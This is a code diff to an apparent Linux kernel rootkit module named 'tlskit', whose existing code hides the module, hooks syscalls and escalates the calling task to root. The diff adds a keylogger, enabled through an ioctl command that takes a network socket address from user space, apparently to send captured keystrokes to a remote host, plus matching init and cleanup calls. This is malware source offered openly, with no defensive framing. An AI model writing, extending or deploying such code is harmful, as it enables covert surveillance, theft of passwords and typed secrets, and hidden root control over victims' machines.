@@ -2,13 +2,19 @@
 #include <linux/proc_fs.h>
 #include <linux/delay.h>
 #include <linux/kthread.h>
+#include <linux/in.h>
+#include <linux/uaccess.h>
 
 #include "module_hiding.h"
 #include "shared.h"
 #include "syscall_hooking.h"
 #include "priv_escalation.h"
+#include "keylogger.h"
 
 static int cleanup(void *_data) {
+
+    /* Stop key logger */
+    disable_key_logger();
 
     /* Remove syscall hooks */
     disable_syscall_hooking();
@@ -28,6 +34,8 @@ static int cleanup(void *_data) {
  * Ioctl communication with the user-space control program
  */
 static long ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
+
+    struct sockaddr_in addr;
 
     switch (cmd) {
 
@@ -53,6 +61,26 @@ static long ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
              * Make the current task root
              */
             privilege_escalation();
+            break;
+
+        case RKCTL_START_KEY_LOGGER:
+
+            /*
+             * Enabled key logger
+             */
+
+            if (copy_from_user(&addr, (void *) arg, sizeof(struct sockaddr_in)) != 0) {
+                return -EINVAL;
+            }
+            enable_key_logger(addr);
+            break;
+
+        case RKCTL_STOP_KEY_LOGGER:
+
+            /*
+             * Disable key logger
+             */
+            disable_key_logger();
             break;
 
         default:
@@ -84,6 +112,8 @@ static int __init tlskit_init(void) {
     if (0 != enable_syscall_hooking()) {
         goto syscall_hooking_failed;
     }
+
+    init_key_logger();
 
     return 0;
 
